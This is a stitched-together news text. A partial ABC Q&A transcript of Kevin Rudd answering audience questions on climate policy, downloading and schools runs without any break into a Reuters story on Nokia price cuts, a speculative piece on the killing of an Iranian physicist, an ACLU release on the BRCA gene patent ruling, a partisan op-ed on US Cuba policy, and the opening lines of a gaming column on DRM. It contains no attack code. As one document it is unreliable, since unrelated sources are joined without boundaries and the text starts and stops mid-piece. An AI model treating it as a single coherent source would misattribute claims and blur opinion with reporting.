Racial prejudice has no place in modern Australia .
Let us make sure that we all work together on that .
TONY JONES : Okay .
I appreciate there are a few people still with their hands up , but we 're going to move on again .
You 're watching Q&A , the show where you get to ask the questions .
If you 'd like to ask a question in person , go to our website and register to join the audience , just like these people have done .
Our next question comes from Ceridwen Radcliffe .
CERIDWEN RADCLIFFE : Prime Minister .
KEVIN RUDD : Ceridwen .
CERIDWEN RADCLIFFE :
It 's so easy to download music and movies on line and difficult to determine whether it 's legitimate and I was just wondering what is your government 's position on the balance between young people 's desire to access affordable entertainment and artists ' desire to protect their creative output ?
KEVIN RUDD :
Well , it 's a hard one .
It 's almost like the question before about civil liberties .
What is intellectual copyright ?
What is the rights of artists to own their property and what are the laws which prevent the sort of free dissemination of that ?
Look , I can't , you know , divine from or say from here , " Here is the dividing line up the middle . "
I really understand how important downloading is to your generation .
My son does this himself , I hope lawfully , and if not we 're in deep trouble .
So ...
TONY JONES : Okay .
KEVIN RUDD : ... getting this balance right is important .
Do we have any - I 'm not aware that we have current changes to the laws in mind .
I just wish to be frank about that .
TONY JONES :
Well , I 've got ask you that , because only last week there was a landmark case in the Federal Court . Iitnet ( sic ) , an internet service provider , won a case that the movie industry took against them .
People were downloading pirated movies using their website - Iinet - and the Federal Court has effectively said you can't stop them doing that .
They won that case .
You 're going to be lobbied heavily by the movie industry .
What will you tell them ?
KEVIN RUDD :
Well , the first thing I 'll say to them in the persistent - consistent with the tradition of evidence - based policy is I 'll read the decision of the court and see what they actually had to say because it 's usually not as black and white as is presented .
But secondly , look , this is an open culture .
It celebrates the fact that you can access different sources of culture and music from right around the world and from artists who you love and enjoy .
If the laws are , through the courts , being interpreted in a particular way , if I take what Tony Jones has said accurately - and being from the ABC I 'm sure he would n't be inaccurate - then we 'll have a look at the decision and see what we can do , but I do n't want to , frankly , make any pronouncement on area of policy .
I just do n't have the evidence in front of me .
I 'd just rather be careful about that .
TONY JONES : All right .
Let 's change subjects again .
The next question comes from Nicky Vreugdenhil .
NICKY VREUGDENHILL : Hi. I 'm from the UN Youth Association .
President Obama appears to be abandoning his scheme to put a price on carbon in the United States , but you 've committed to introducing an emissions trading scheme in Australia .
When Obama comes to Australia in March , will you lobby him to fight for a similar cap and trade system in the United States ?
KEVIN RUDD :
The key thing here is to action on climate change .
You know what 's great about America under President Obama is they 've suddenly entered into action .
The previous US administration said that it was n't anything for them .
Now we have America at the table and it makes such a huge difference .
So when it comes to the targets that we have been discussing recently about bringing down greenhouse gas emissions , now you have America fully engaged in the global negotiations for the future .
That 's the first thing .
The second is how do you go about realising those targets ?
Our conclusion , as the government of Australia , is that the most effective way and the least costly way of doing it is through an emissions trading scheme .
That 's been our approach .
We , in Australia , like the Americans , face something called a political constraint and - I can't quite see you now , mate .
There 's someone in the road .
There you go - and it's called the senate - the US Senate and the Australian Senate - and they have both put this huge roadblock in the way and so obviously President Obama is looking at the possibility of how you mix a response to the targets which America must realise as the second biggest polluting country in the world after China and how you mix that with the future possible introduction of an emissions trading scheme there .
So he 's got political realities to deal with .
TONY JONES : Is n't it going to be a serious problem for your government if the United States rejects a global carbon trading scheme and , to go back to the question , will you be lobbying President Obama ...
KEVIN RUDD : No .
TONY JONES : ... to actually make sure they do get a carbon trading scheme ?
KEVIN RUDD :
Well , I was speaking to the US ambassador about the president 's upcoming visit just the other day and my best understanding is that the US is looking still at how it wrestles this cap and trade system to the ground .
When they can do it and when they can deliver it is a separate question .
I look forward to talking to him about it .
The key thing is real action .
You say ...
TONY JONES : That 's what Tony Abbott says , direct action .
In fact , he says - he now says - he now says that his plan is more similar to what the Americans are going to do than your plan is .
KEVIN RUDD : No , what Tony Abbott says about - now that you 've raised him - about climate change is , quote , " It 's absolute crap " , unquote .
That 's what Tony Abbott says about his view on climate change .
That 's not Barack Obama 's view and it's not my view .
There 's a big difference , because that 's the foundation stone .
You either believe the science or you reject the science .
We , the government , believe the science .
The US government believes the science under President Obama .
The next question is what you do and in terms of the different schemes .
What do we do ?
We say we charge the biggest polluters .
Secondly , we use that money to compensate working families for any costs which flow through to them and , thirdly , that gives them the money also to invest in energy efficiency measures themselves .
That 's what a cap and trade system is about , because you are ultimately also putting a cap on carbon pollution .
His system does n't do that .
TONY JONES :
No doubt you 've seen all the hands going up in the audience .
Before we come to some of those people with their hands up , we do have another question on this topic .
You 've alluded to it already to some degree .
Let 's go to Blaise Joseph .
BLAISE JOSEPH : Prime Minister , given the climate - gate email scandal , given the fact that the IPCC claims on Himalayan glaciers melting and Amazon rainforests disappearing both have been proven to be fabricated , and now given that the Dutch government is reviewing all claims of the IPCC , do you still have full confidence in the IPCC and is it still necessary to rush ahead with your ETS ?
KEVIN RUDD :
The first thing I 'd say is ...
AUDIENCE MEMBER : ( Indistinct )
KEVIN RUDD :
As you can see there is a bit of division on that in the room , like the chamber up the hill .
The first thing I 'd say is the IPCC - International Panel on Climate Change - scientists has 4000 essentially humourless scientists in white coats who go around and measure things and have been doing so for about 20 years .
They reached a conclusion about , first of all , climate change happening and , second , the high likelihood , defined as 90 per cent plus , of it being caused by human activity sometime ago .
I 'm saying that 's actually what the IPCC has concluded .
The second thing is this : here in Australia the government has been in receipt of advice from the CSIRO , the Bureau of Meteorology , the Chief Scientist , that that 's what 's happening here .
So as the Prime Minister of Australia you stand back and you say , " Well , the 4000 scientists in white coats are all wrong , the CSIRO is all wrong , the Australian Chief Scientist is all wrong and also the Bureau of Meteorology is all wrong . "
Well , I 'm not prepared to take that risk .
I 'm not prepared to take that risk for your future in 20 years time , 40 years time , 60 years time .
My view is this generation of political leaders has a responsibility to act - has a responsibility to act .
And you can play the easy game of retail politics , which is to say this is all too hard , go round and use loose language , like , you know , the climate change science is incapable of being trusted and take a massive risk with the future .
The government I lead will not do that .
TONY JONES : Okay .
All right .
A lot of people - hold on .
We 've got a lot of people with their hands up .
What I intend to do here is go around and just get comments from a number of you , okay ?
We 'll start with this gentleman in the - no , back there .
Second row in the black shirt .
AUDIENCE MEMBER : Mr Rudd , regarding climate change , can Copenhagen be deemed as anything but a failure ?
KEVIN RUDD : Am I answering these ?
TONY JONES : Well , I think you better answer that one .
KEVIN RUDD :
You 've just changed your rules after one question .
The ...
TONY JONES : Okay .
No , we 'll take a few questions .
KEVIN RUDD : No. No. I 'll answer ...
TONY JONES : All right .
All right .
Go ahead .
KEVIN RUDD : ... so it 's not forgotten , because you 're going to have this whole pile of things .
Firstly , four things were achieved at Copenhagen .
One , first time the world community said , " We cannot allow temperature increases to go beyond two degrees centigrade . "
That was not part of global concord before .
Second that they said was this - the second point they said was this : that developed and developing countries for the first time must contribute to the reduction of greenhouse gas emissions .
In the past the big emerging economies , like China and India , were not in the play .
And the third thing is for the first time a global system of measurement - that is to make sure that the commitments and targets which are agreed to by governments actually happen on the ground .
Did it achieve everything that we wanted to achieve ?
Absolutely not .
But if it did n't achieve those three things , frankly we would be even further behind than we are now and I go back to what I said .
This government is committed to action on climate change nationally and globally because the future of the planet and your generation depends on it .
TONY JONES : Okay .
We 've actually got another question in the audience , before I go to the rest of you with your hands up , from Kane Wishart .
Where 's Kane ?
Wait for the microphone there , Kane .
KANE WISHART : Hello , Prime Minister .
KEVIN RUDD : G'day , Kane .
KANE WISHART : Given , as we 've heard , there 's a climate of denialism around and the opposition have been attacking your ETS as a great , big nasty spooky tax or whatever they 're calling it , is n't it time your government looked afresh at other measures that are evidence based , such as a consumption side carbon tax , which can be revenue neutral , which wo n't affect international competitiveness and can go to a scientifically credible outcome ?
KEVIN RUDD : Look , there are three broad categories for acting on climate change .
One is the market - based system , which is called an emissions trading scheme .
The great irony of current Australian politics is the Labor Party supports the market - based system and the conservatives are supporting the command and control system of handling this , but I 'll leave others to wrestle with that little dilemma .
You go to the third option , which is to use a carbon tax itself .
We 've looked at this and looked at it very hard .
From our point of view it does not create the incentives necessary to change behaviour in the same manner that an emissions trading scheme does .
TONY JONES : Can I just interrupt you , because you did look at it and look at it very hard , and you hired Professor Garno to do that looking for you , to a large degree , and advise you and now he 's advising you to go for a carbon tax for the next two years because he does n't believe an emissions trading scheme is going to work in this country .
It 's not going to happen .
It 's not going to get through the senate .
KEVIN RUDD : Well , his argument , yeah , is a political one and that goes to the question of the future of the emissions trading legislation in the parliament .
Still a few hoops to go through up the hill on that but his argument is not a substantive one .
He says that by far and above an emissions trading system is preferable because it does this : it puts a cap on carbon .
It charges the polluters and as a result of that provides compensation from that charge to working families .
What we 've got with the alternative scheme on offer is one which does less .
In fact , the current scheme proposed by Mr Abbott increases greenhouse gas emissions by 13 per cent , costs more , tax payer pays three times as much and is totally unfunded .
That is the basic difference .
TONY JONES : Okay , what about just very briefly on this Bob Brown - Tony Abbott says you do n't have a plan B .
When that does n't get through the senate , Bob Brown is offering you a plan B of a two year interim carbon tax .
$ 20 per tonne .
That 's what the Greens are offering to vote for and to help you get the extra votes in the senate .
You are actually talking to them .
At least Penny Wong is .
Are you seriously talking to them ?
Is this a potential plan B ?
KEVIN RUDD :
If your question goes to the carbon tax question , which was raised over here before , the answer is no .
Secondly , your point about the Greens goes headlong into mathematics .
The Greens do n't control with us the numbers in the senate .
You 've got three independents there and some of you may have read the writings of Senator Fielding on the question of climate change .
It 's all - and you worry me if you applaud that , because let me tell you it 's all one global communist conspiracy and watch out and lock up your friends .
It 's going to come and get you in the middle of the night .
We have a different approach , which is this is happening , it 's real and sensible political leadership lies in how do you best deal with this in a way which works , which works environmentally , because the consequences of this country , which is among the hottest and driest continents on earth , would be one where the effects of climate change are felt first and hardest .
That 's why this government is determined to act .
TONY JONES : All right .
Let 's hear some quick comments from the audience .
I stress this , comments , because we do n't have time to answer a whole series of other questions and still get on to the other subjects .
So if you want to comment , keep your hand up .
The young lady down the front .
AUDIENCE MEMBER :
Well , you keep saying that , you know , your government keeps acting on climate change .
Do you think that , you know , it 's feasible that because you also say that , you know , you 're supporting a big Australia .
How realistic do you think it is to have a big Australia and reduce your carbon emissions at the same time ?
KEVIN RUDD :
The first thing is just to look at the reality and it goes back to questions which have been raised already about immigration and the fact that this country has been open to immigration since the war .
The population projections for Australia , which have been discussed recently , are there in the intergenerational report produced by the Treasury , as it was under Mr Costello on two occasions prior to us and it's simply taking the natural fertility rate in the country , adding to it the historical levels of migration .
And you go out to the projections for 2050 , which has been talked about , and producing a population of 36 million .
Guess what ?
That assumes a population growth in Australia slower in the next 40 years than it was in the last 40 years .
So let 's just keep all this into perspective .
The second point is the big challenge with population is how do you plan effectively in terms of the infrastructure needs of the future , and that is one of the big future challenges facing Australia .
Acting on climate change , planning our infrastructure needs , making sure that we 're building the skills base for the Australian economy for the future , because we want to be a world competitive economy , an open society , but it means grabbing these future challenges , not pushing them to one side .
TONY JONES : Just a couple more , and I stress comments here , because we do n't have time .
Let 's hear from this young lady at the back with her hand up .
AUDIENCE MEMBER :
In the absence of international agreement , how confident are you ...
TONY JONES : Oh , that 's a question .
( AUDIENCE LAUGH ) .
AUDIENCE MEMBER : Sorry , I 'll try to rephrase it .
But how confident are you in the effect ...
( AUDIENCE LAUGH )
TONY JONES :
That 's all right .
I 'm sorry .
Go ahead .
Keep going .
AUDIENCE MEMBER : ... in the effectiveness of the implementation of an Australian ETS , both strategically and financially .
KEVIN RUDD :
Well , the virtue of an emissions trading scheme domestically within Australia is that it's a market - based scheme but which caps carbon pollution .
One of the problems with the alternative scheme is that it does n't .
That 's the big difference .
You also talk about international measures .
As I said before , in response to the question about Copenhagen , for the first time governments around the world agreed on a global monitoring and measurement system .
Prior to that we had no such agreement .
So you would be right to be sceptical about the future in the absence of a mechanism to measure what people are doing .
None of this is easy .
It is all really hard , but there are two big strategic options in the future : bury your head in the sand and hope it all goes away or act .
We 're in the business of acting .
TONY JONES : Okay .
You 're watching Q&A .
Remember , you can send your web or video questions to our website .
The address is on the screen , or join the Twitter conversation .
And in just a matter of interest tonight - we have a matter of interest here .
Apparently tonight 's program has peaked as the number one trending topic on Twitter worldwide .
That 's hard to believe , is n't it ?
Okay .
But apparently it 's true .
( AUDIENCE APPLAUD )
KEVIN RUDD : I 'd like to know how you knew that ?
TONY JONES : I did n't know that but someone has told me that , evidently .
Our next question tonight comes from the floor of old parliament house .
It 's from Kate Campbell .
KATE CAMPBELL : Prime Minister , the school performance measures cited on the My Schools website clearly show that those schools situated in lower socioeconomic areas generally achieve poorer results than their counterparts with a higher socioeconomic index .
Rather than the current crude method of naming and shaming , what tangible efforts is the Rudd Government going to make to support the students , teachers and parents in these disadvantaged areas ?
KEVIN RUDD : Okay .
Three quick points .
One is we believe in transparency .
That is that every school in the country , and there are 10,000 of them - primary schools , secondary schools , government , non-government - should be answerable to the parents of Australia how the school is performing against very basic skills tests - literacy , numeracy , spelling , grammar , stuff like that .
Secondly , the virtue of having the information also enables the government , through Julia Gillard , Deputy Prime Minister and Education Minister , where to intervene and provide support .
If you simply are in the business of putting up a list and saying " Gee , there 's a problem over there , " and then walking away , it would n't make any sense .
But if you 're in the business of saying , " Here 's a problem and here is an investment fund of $ 2 billion to be made available to disadvantaged schools , then you know where it's to go , what specific literacy and numeracy programs may be useful to overcome problems at year three , year five through year seven and provide the resources to it .
The last thing I 'd say about the measure itself is simply bear this in mind : this is the first time we 've done this .
On top of it we intend also in the year ahead , if the government is returned , to have tested the attitudes of parents about the overall performance of the school .
What sort of culture is in the school ?
Are they community engaged schools ?
Are they schools which are really being innovative in the way in which they bring the best out of their children .
In other words a rounder view of the school .
This will go up on the website , as well .
TONY JONES : How is that going to be tested ?
Are you going to bring them in to do their own little NAPLAN Tests in school halls ?
How are you going to do that ?
KEVIN RUDD : You mean the surveys ?
They 'll be ...
TONY JONES : No , the parents .
KEVIN RUDD : No , the parents will be surveyed by normal means by a survey company .
If you 've got a school community of 500 kids , you 've got , you know , a bunch of parents in that community and therefore you 'll survey them .
The details of this will be sorted out during the year , but the question goes to how do you provide a balanced view of the school ?
One is the intrinsic performance on literacy , numeracy and the basics and the second is what sort of school is it in the eyes of those who entrust their kids to it ?
Nothing is perfect but we want to help create in this country what we describe as an education revolution and that means making sure that our young people have all the skills necessary to properly participate in the workforce of the future and to have the tools to do that as well .
TONY JONES : Just a quick follow up on that .
This fund you 're talking about which will direct billions of dollars , I think you said , to the disadvantaged schools who are identified by these tests , how are we going to know it 's as a result of the test ?
Is there going to be some sort of measure for that ?
KEVIN RUDD :
Well , I 've discussed this with Julia , as well .
All these things will be measured , befores and afters , but do you know something ?
You could n't get to first base until you 've got an initial set of measures .
There are going to be inaccuracies .
Let 's just accept that .
But I 'd much rather have a national education system where our 10,000 schools know how their schools are performing and if you 've got , for example , a real problem at a - consistently at a year five , seven and nine level but no such problems at a year three level , well , what 's happening in that school ?
If there are problems just emerging at the year nine level , which were n't evidenced in the earlier years , what 's happening in that school ?
These are questions to be asked but , frankly , the objective is about how you improve the quality of what we do but it adds up to nothing unless you are actually providing schools with extra resources to make it happen .
TONY JONES : All right .
We need to do this for two hours next time , because we are almost out of time .
Let 's go to our final question , which comes from John Casey .
JOHN CASEY : Mr Prime Minister , tonight has mostly been about us giving our vision for the future of Australia .
I think it 's now your turn .
Where do you see Australia in 20 years and what are your hopes , dreams and plans for the future of Australia ?
KEVIN RUDD :
Thanks for that question .
It 's really important .
Part of being where you guys are is to think about your futures and have your views to us about where you want the country to be .
So in summary it 's a bit like this .
Number one is this : I want this country , Australia , in the future to have a strong economy , which enables us to provide the jobs of the future which have been described before .
You do n't have that , you do n't have much .
Second , how do you build that ?
You make this country as productive as possible and there are two ways you can make that happen .
Investing in what we 've just been talking about : the education revolution .
In preschools , in schools , in TAFEs , in universities , in research institutes , which is what we 're doing right across the spectrum through a 100 per cent increase in the overall education budget .
The third thing is to make sure we 've got modern , state of the art , 21st century infrastructure .
It stinks that we 've got a broadband system in this country which is probably the third slowest in the OECD and probably one of the most expensive .
That 's what we 've got .
That 's why we 're going to roll out a National Broadband Network , the information highway of the 21st century .
But the last thing is this : to make sure also that this future Australia , which is prosperous , which is strong , which is creating jobs of the future is also one where we have made the right decisions to ensure that this is a sustainable country , as well .
Sustainable environmentally but the questions of tolerance and harmony and shall I say our unity are preserved in the future .
That 's the sort of Australia I want for the future .
Five broad objectives but none of them work unless you get in behind them with real , practical policies which make a difference .
What we 're doing is not perfect but that 's the direction we 're trying to take the country in .
TONY JONES : I 'm sorry to you who still have your hands up , because that is all we have time for tonight .
Please thank our guest , the Prime Minister , Kevin Rudd .
Okay .
And can you also thank our hosts , the Museum of Australian Democracy , who lent us this amazing chamber in Old Parliament House .
Okay .
You 've got one more chance to clap .
Give yourselves a round of applause for being a night of great questioners .
All right .
Next Monday on Q&A we 'll have a panel of very lively guests : the Finance Minister Lindsay Tanner ; the Shadow Minister Finance Spokesman Barnaby Joyce ; author and business analysts Satyajit Das ; commentator Melinda Tankard Reist ; and social researcher Rebecca Huntley .
If you 'd like to know more about our panellists , you can visit our website , abc.net.au / qanda or send your questions in so - if you 'd like to get an answer to them obviously .

HELSINKI ( Reuters ) - Nokia NOK1V .HE cut phone prices across its portfolio in late January , putting its cheapest smartphones on a collision course with mid-range phones from rivals Samsung 005930 .KS and Sony Ericsson .

Nokia said price changes were part of its normal , ongoing business .
The world ’s top cellphone maker usually cuts prices across its portfolio a few times each year .
Several industry sources told Reuters Nokia had cut prices by up to 10 percent .
After the price cut Nokia ’s cheapest smartphone model , the 5230 , retails for around 170 euros ( $ 239 ) in Finland .
The model ’s wholesale price is now below 120 euros .
Demand for cheaper smartphones has helped the segment grow despite the recession , defying the broader , weaker industry trend .
Sales jumped 30 percent in the October - December quarter according to research firm Strategy Analytics .
Nokia said last week that revenue from smartphones jumped 26 percent in the quarter from the previous quarter to 3.9 billion euros , helping power its overall result .
The average wholesale price of its smartphones dipped to 186 euros from 190 euros in the third quarter .
The falling prices have hurt handset vendors like Sony Ericsson 6758 .
TERICb.ST , who have focused on mid-range or feature phones , which often boast good cameras or music players but lack computer - like open operating systems .
These have been cheaper than smartphones , but the price difference is declining fast .
“ This latest round of price adjustments sees Nokia taking its low - cost Symbian devices into new territory , ” said Ben Wood , research director at CCS Insight , a British firm that tracks the wholesale prices of mobile phones in Europe .
Nokia ’s price cuts come as the industry returns to growth following a grim 2009 marked by recession - hit consumer demand .
Nokia says it expects the cellphone market to grow 10 percent this year .

At 10:13 am this morning , the Tehran - based Fars news agency reported that Masoud Ali Mohammadi , a prominent physics lecturer , had been killed by a " terrorist act " .
According to the report , he was killed by a remote control bomb placed in a motorcycle .
The bomb exploded as he left his house in the semi-upmarket Gheytariye neighborhood of Tehran .
One hour and nine minutes later , at 11:22 am Tehran time , the same news agency , this time quoting Tehran 's chief prosecutor , declared that the victim was in fact a nuclear scientist .
According to the same report , the booby - trapped motorcycle which killed him was placed next to his car .
The blast was strong enough to smash nearby windows .
The news was subsequently picked up by the Tehran - based Press TV .
Masoud Ali Mohammadi was a well known lecturer at Tehran University .
He specialised in quantum physics and had received his PhD in 1992 from the prestigious Sharif University .
This morning the offices of the Oghab - 2 counter intelligence bureau must have been be buzzing with questions , and concerns .
This bureau was specifically established in December 2005 to prevent information regarding Iran 's nuclear programme , its scientists and installations , from falling in the hands of foreign intelligence agencies and domestic opposition groups .
The probability that Mohammadi was assassinated by an Iranian opposition group such as the People 's Mujahideen ( MKO ) may be small .
However it can not be dismissed .
The MKO have assassinated senior military officials in broad daylight before .
A famous example was the assassination of General Ali Seyyed Shirazi , the chief of staff of the Iranian army , on his doorstep in April 1999 .
Although normally they would have a lot to gain by targeting a political figure , such as a senior politician , assassinating a nuclear scientist could also be beneficial to them .
Such people would be highly prized targets , and their elimination a severe embarrassment for Ahmadinejad government .
It would also send a strong message to Tehran 's government about the increasing intelligence - gathering capabilities of the group .
It is also possible that Mohammadi was assassinated by a foreign intelligence agency .
Should that be the case , this recent incident comes amid a series of setbacks for the Oghab - 2 counter intelligence bureau .
First was the mysterious death of Ardeshir Hassanpour , a nuclear scientist in January 2007 .
According to the Times of London , he was assassinated .
This was followed by the disappearance of General Ali Reza Asgari in March 2007 .
Some believe that he defected to the US .
And this year Shahram Amiri , a nuclear scientist , disappeared during a pilgrimage to Saudi Arabia .
Some believe he defected , while other reports talk about his kidnapping .
Either scenario does not bode well for Iran 's intelligence community .
This was then followed by the exposure of the secret nuclear site in Fordo , near Qom , by President Obama .
Setbacks for Iran 's intelligence apparatus against their western counterparts are bound to weaken Tehran 's hands in its dealings with the west .
They show that the western intelligence community is making progress in penetrating Iran 's nuclear programme .
This means that Iran 's nuclear goals and capabilities are going to become more clearly known , making it more difficult for them to develop a strong bargaining position .
In fact it is very possible that this is one of the reasons why the US is insisting that Iran transfers 75 % of its low enriched Uranium ( LEU ) in one batch to Russia and then to France for conversion to nuclear fuel .
One can not rule the possibility that US intelligence officials , via their own resources or through intelligence agencies , have discovered that Iran is running out of yellowcake , which is needed to make LEU .
Therefore once the 1200kg of LEU becomes nuclear fuel , Iran will no longer be able to produce a bomb , as it will not have the amount of LEU required at its disposal .
And this could be the reason why Iran is insisting to transfer the LEU in batches .
Tehran may be hoping that by dragging out the process , it might find new sources .
The fact that Tehran was caught recently trying to buy yellowcake in Kazakhstan adds weight to this possibility .
Since George Bush left office , many people have begun to dismiss the possibility of a US attack against Iran .
Judging by today 's event , the same can not be said about an intelligence war against Iran .
Obama is no Bush , but he is no pacifist either .
It is possible that he , alongside other allies , is going to rely more and more on intelligence as an alternative to military action .
With domestic problems increasing at home , this will disappoint Ayatollah Khamenei , as such operations do not provide him with much needed excuses to try and rally the public around the flag .

NEW YORK – Patents on genes associated with hereditary breast and ovarian cancer are invalid , ruled a New York federal court today .
The precedent - setting ruling marks the first time a court has found patents on genes unlawful and calls into question the validity of patents now held on approximately 2,000 human genes .
The ruling follows a lawsuit brought by a group of patients and scientists represented by the American Civil Liberties Union and the Public Patent Foundation ( PUBPAT ) , a not - for - profit organization affiliated with Benjamin N. Cardozo School of Law .
" Today 's ruling is a victory for the free flow of ideas in scientific research , " said Chris Hansen , a staff attorney with the ACLU First Amendment Working Group .
" The human genome , like the structure of blood , air or water , was discovered , not created .
There is an endless amount of information on genes that begs for further discovery , and gene patents put up unacceptable barriers to the free exchange of ideas . "
The ACLU's and PUBPAT 's lawsuit against Myriad Genetics and the University of Utah Research Foundation , which hold the patents on the BRCA genes , as well the U.S. Patent and Trademark Office ( USPTO ) , charged that the challenged patents are illegal and restrict both scientific research and patients ' access to medical care , and that patents on human genes violate the First Amendment and patent law because genes are " products of nature . "
The court today granted the U.S. Patent and Trademark Office 's ( USPTO ) request that it be released as a defendant in the lawsuit .
The court found that it was unnecessary to reach the First Amendment claims against the USPTO because it had already ruled in favor of the plaintiffs .
The lawsuit , Association for Molecular Pathology , et al. v. U.S. Patent and Trademark Office , et al. , was filed on May 12 in the U.S. District Court for the Southern District of New York on behalf of breast cancer and women 's health groups , individual women , geneticists and scientific associations representing approximately 150,000 researchers , pathologists and laboratory professionals .
Because the ACLU 's lawsuit challenges the whole notion of gene patenting , its outcome could have far - reaching effects beyond the patents on the BRCA genes .
Approximately 20 percent of all human genes are patented , including genes associated with Alzheimer 's disease , muscular dystrophy , colon cancer , asthma and many other illnesses .
The court recognized the far - reaching impact of the case on medical research and public health .
The opinion stated , " … the resolution of the issues presented to this Court deeply concerns breast cancer patients , medical professionals , researchers , caregivers , advocacy groups , existing gene patent holders and their investors , and those seeking to advance public health . "
" The court correctly saw that companies should not be able to own the rights to a piece of the human genome , " said Daniel B. Ravicher , Executive Director of PUBPAT and co-counsel in the lawsuit .
" No one invented genes .
Inventions are specific tests or drugs , which can be patented , but genes are not inventions . "
The specific patents the ACLU had challenged are on the BRCA1 and BRCA2 genes .
Mutations along the BRCA1 and 2 genes are responsible for most cases of hereditary breast and ovarian cancers .
Many women with a history of breast and ovarian cancer in their families opt to undergo genetic testing to determine if they have the mutations on their BRCA genes that put them at increased risk for these diseases .
This information is critical in helping these women decide on a plan of treatment or prevention , including increased surveillance or preventive mastectomies or ovary removal .
" We are extremely gratified by this groundbreaking decision , " said Sandra Park , staff attorney with the ACLU Women 's Rights Project .
" This is the beginning of the end to patents that restrict women 's access to their own genetic information and interfere with their medical care . "
The patents granted to Myriad give the company the exclusive right to perform diagnostic tests on the BRCA1 and BRCA2 genes and to prevent any researcher from even looking at the genes without first getting permission from Myriad .
Myriad 's monopoly on the BRCA genes makes it impossible for women to access alternate tests or get a comprehensive second opinion about their results and allows Myriad to charge a high rate for their tests .
Several major organizations , including the American Medical Association , the March of Dimes and the American Society for Human Genetics , filed friend - of - the - court briefs in support of the challenge to the patents on the BRCA genes .
Attorneys on the case include Hansen and Aden Fine of the ACLU First Amendment Working Group ; Park and Lenora Lapidus of the ACLU Women 's Rights Project ; and Ravicher and Sabrina Hassan of PUBPAT .

Cuban crimes and U.S. apologists
As if the world needed further reminding , in recent weeks there have been two events that underscore the unremitting brutality of the Castro regime in Cuba .
Just last week , human rights activists reported on the death of political prisoner Orlando Zapata Tamayo after an 83 - day hunger strike .
An Amnesty International Prisoner of Conscience , Zapata Tamayo was a 42 - year - old Afro - Cuban dissident who was serving a 36 - year sentence for the Orwellian crime of " dangerousness . "
Amnesty lamented , " Faced with a prolonged prison sentence , the fact that Orlando Zapata Tamayo felt he had no other avenue available to him but to starve himself in protest is a terrible indictment of the continuing repression of political dissidents in Cuba . "
Indeed .
In the second incident , last December , American citizen Alan Gross was jumped by Cuban state security agents as he attempted to leave Cuba after providing communications equipment to help apolitical Cuban Jewish groups access the Internet .
He has been held since in a cell in the notorious Villa Marista state security headquarters in Havana .
One would think that decent people everywhere would be appalled at these outrageous assaults on freedom and human dignity , and thankfully most are .
( A searing Washington Post editorial here on the death of Zapata Tamayo . )
Unfortunately , that does n’t include the dogged legions of critics of U.S. - Cuba policy who can find no criminal act by the Castro regime that cannot be explained or excused .
Even an action as heinous as the death of a political prisoner wo n’t dissuade them .
The incessantly critical Center for Democracy in the Americas (! ) " laments " the death of Zapata Tamayo , but " joins … others in urging changes in Cuba policy as the right response . "
Not to be outdone in bad taste , another critic , Phil Peters of the Lexington Institute , points visitors to his blog to a Cuban government statement on medical attention given to Orlando Zapata before his death , before , er , chiding the Castro regime that it is responsible for the well - being of prisoners in its custody , just as the United States is " for prisoners it holds at Guantanamo or anywhere else . "
Mr. Peters apparently fails to see the obscenity of comparing captured terrorists to a Cuban prisoner of conscience .
In the case of arrested American Alan Gross , the twisted perspective is equally contemptible .
Gross was in Cuba under a USAID program that began during the Clinton Administration to provide material support to families of Cuban political prisoners and human rights activists .
The program was expanded by the U.S. Congress during the Bush Administration to encompass " New Media " technology — including Internet access and cell phones — for Cubans wishing to carve out some semblance of independent space on the island .
One would think that a fellow American jailed by a totalitarian regime for trying to help its people would cause these commentators to close ranks behind the unfortunate individual , but they are perfectly willing to throw him to the wolves .
Julia Sweig of the Council on Foreign Relations helpfully echoes the regime ’s rationale in the Washington Post , " I believe the Cubans arrested him to force the U.S. government to focus on the provocative nature of these aid programs , which are designed to push for regime change . "
The dean of Castro apologists , Wayne Smith of the Center for International Policy , throws Mr. Gross an anchor when he intones to the Miami Herald , " Maybe he was up to something he should n’t have been up to . "
An anti-embargo blog , The Havana Note , offers this message of solidarity :
" The issue is not only the US magnifying the importance and saying nice things about marginal political opponents of a government everyone else in the world but we recognize , but also that it subsidizes them while maintaining a harsh embargo on travel and trade . "
It is a wonder the Castro regime pays anyone to write its propaganda when there are so many outside Cuba so willing to carry the regime ’s water .
Finally , elsewhere on this site the ubiquitous Mr. Peters is back at it , penning the equivalent of a Castro ransom note for the unfortunate Mr. Gross : " It would be far better if a long - overdue review [ of U.S. - Cuba policy ] were prompted by something other than Gross ’s arrest " ( although he is willing to allow it to be prompted by just that ) .
He says President Obama " would do well to slash or scrap USAID ’s Cuba program " because " current policies play naively and directly into the hands of Cuban state security . "
Not only is he oblivious to the irony of his own recommendation playing precisely into Havana ’s hands — arrest an American , shut down the aid program — but he appears unconcerned about the dangerous signal that would send around the world about America ’s willingness to stand by oppressed peoples seeking respect for their inalienable rights .
From these morally bankrupt perspectives , the problem in Cuba is not a brutal , unrepentant , and unreformed Stalinist regime , but a U.S. policy that attempts to help Cubans connect with the outside world beyond regime control or claim their essential freedoms .
America should count its blessings such a mindset never prevailed during the Cold War , lest the Berlin Wall still be standing .
The double standard regarding Cuba has been a source of enduring frustration for Cuba democracy advocates .
Just last year , regional leaders invited Cuba back into the fold of the Organization of American States , despite its five decades of rigged one - party " elections , " yet continue to shun democratic and peaceful Honduras .
The world rightly honors a long - serving political prisoner like Nelson Mandela , but could n’t name one of several Cuban political prisoners who served longer sentences in the Cuban gulag than Mandela ’s 27 years in South African prisons .
Activists demanded U.S. intervention in Pinochet ’s Chile to support regime change there , but any such effort to support democratic forces in Cuba is deemed " illegitimate . "
Of course , international human rights organizations have been forced to confront the regime ’s systematic abuse of human rights , but they also insist on getting their licks in on the United States , as if U.S. policy forces the regime to assault dissidents in the streets or deny Cubans their fundamental freedoms .
It is a sad state of affairs , and one that show no signs of abating .
Obviously , activists are in a state of panic as they see their dreams of an Obama Administration unilaterally and unconditionally normalizing relations with the Castro regime evaporating into thin air .
Clearly , no U.S. President is going to risk the dignity of his office reaching his hand out to a thug regime that demonstrates no willingness to abide by any elementary norms of civilized behavior .
No question there are some sincere critics of current policy that believe opening up Cuba to U.S. trade and travel will transform Cuba into a Jeffersonian democracy .
But they fail to understand the true nature of the Castro brothers ’ regime .
A unilateral reversal of U.S. policy at this point would accomplish nothing but making the United States an accomplice in the Castro regime ’s continued crimes again the Cuban people .
I 'm sure you 've noticed that this column is called " Experienced Points " .
Since I suffer from an RPG form of substance abuse , this seemed like a good thing to call the column .
Lately it 's been looking like I should have called it , " Shamus Young wo n't shut his fat stupid mouth about DRM oh God he 's doing it again I think my eyes are bleeding someone please make him stop please oh please " .
